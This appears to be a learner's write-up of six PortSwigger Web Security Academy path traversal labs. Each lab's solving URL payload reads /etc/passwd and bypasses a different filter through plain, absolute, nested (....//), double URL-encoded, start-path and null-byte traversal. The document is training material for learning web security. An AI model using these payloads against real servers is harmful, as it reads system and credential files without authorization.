# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), simple case

This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


we start by accessing the page source code and copied the path to the image file:


```http
https://0a36005e034cede280fe3198000b00f4.web-security-academy.net/image?filename=48.jpg
```

we now modify this link to the path of `/etc/passwd` :

```http
https://0a36005e034cede280fe3198000b00f4.web-security-academy.net/image?filename=/../../../etc/passwd
```

and we solved the lab:


![1695712761088.png](./1695712761088.png)



# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences blocked with absolute path bypass


This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images. supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


Accessing the challenge link; we try fuzzing for the directory traversal vulnerability as done earlier in the first lab

we copy the address of one of the images and editted it as follows:

```http
https://0ad1000e03af75ed84db10bf006600f6.web-security-academy.net/image?filename=/etc/passwd
```

we use the absolute file path to access the etc/passd file and solved the lab:

![1695715319507.png](./1695715319507.png)




# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences stripped non-recursively

This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

After fuzzing we use the following link to access the /etc/passwd file

```http
https://0a200069044e71f880564996008f0009.web-security-academy.net/image?filename=....//....//....//....//etc/passwd
```

as you could see, we added `....//` at the beginning of each traversal, this is done to bypass the stripping of the traversal sequences. These revert to simple traversal sequences when the inner sequence is stripped.

sending this request solves the lab:

![1695715831462.png](./1695715831462.png)


# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences stripped with superfluous URL-decode


This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

In this challenge we tend to bpyass the stripping of traversal in the web server in a multipart/form-data request to it.

bypassing this kind of sanitization by URL encoding, or even double URL encoding, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.

we used the second option of encoding the traversal in this lab we use the following:

```http
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```

this is simply the traversal payload we have been using in the previous lab url-encoded twice, decoding it twice gives us back the payload:

 ![1695716524822.png](./1695716524822.png)



we send this request in burp:

 ![1695716550939.png](./1695716550939.png)

and we got the following response:

 ![1695716595099.png](./1695716595099.png)

And we solved the lab:

 ![1695716627989.png](./1695716627989.png)




# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), validation of start of path

This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

This lab talks about the validation of the start path where the server fetchs the image content from, to solve this lab we simply traverse out of this lab and access the passwd file using the following payload:

```http
https://0a0b004103a4630d803ed106005f00c2.web-security-academy.net/image?filename=/var/www/images/../../../../../etc/passwd
```

sending this request solves the lab:

 ![1695716925240.png](./1695716925240.png)


# Lab: [File path traversal](https://portswigger.net/web-security/file-path-traversal), validation of file extension with null byte bypass

This lab contains a [path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

In this lab, our aim is to bypass the extension added at the end of the file name in this case the .png extension added by default, the trick here is to use the null byte to escape it so as to retain the filename, we use the url encoded null byte `%00` and append it at the end of our filename including the .png extension: 

```http
https://0a2800b70336a269800ed0a20025001c.web-security-academy.net/image?filename=../../../../../etc/passwd%00.png
```

sending this request solves the lab:

 ![1695717283024.png](./1695717283024.png)



And that's the end of the path travesal labs on portswigger!!!!
